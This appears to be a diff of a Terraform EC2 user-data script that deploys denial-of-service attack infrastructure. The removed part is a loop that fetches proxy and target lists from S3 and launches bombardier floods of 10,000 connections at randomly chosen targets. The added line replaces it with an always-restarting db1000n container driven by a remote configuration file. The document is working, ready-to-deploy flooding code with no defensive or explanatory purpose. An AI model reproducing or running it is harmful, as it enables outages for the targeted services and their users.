@@ -172,23 +172,8 @@ exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
     service docker start
     usermod -a -G docker ec2-user
     chkconfig docker on
-    while true
-    do
-        sleep 60
-        if [ $(docker info --format '{{ .ContainersRunning }}') == "0" ]
-        then
-            echo no container running
-            aws s3 cp s3://${var.bucket_name}/proxies.txt proxies.txt
-            sed 's/\r$//' proxies.txt > proxies1.txt
-            aws s3 cp s3://${var.bucket_name}/addresses.txt addresses.txt
-            sed 's/\r$//' addresses.txt > addresses1.txt
-            export DOCKER_PROXY=$(shuf -n 1 proxies1.txt)
-            export TARGET_ADDRESS=$(shuf -n 1 addresses1.txt)
-            export RUN_FOR=$(shuf -i 12-26 -n 1)
-            date
-            docker run --rm -ti -d --name volia --env HTTP_PROXY="http://$${DOCKER_PROXY}" alpine/bombardier -c 10000 -d $${RUN_FOR}m -l $${TARGET_ADDRESS}
-        fi
-    done
+    docker run -it -d --restart always ghcr.io/arriven/db1000n ./main -c https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/config.json
+
 
 EOF
   )
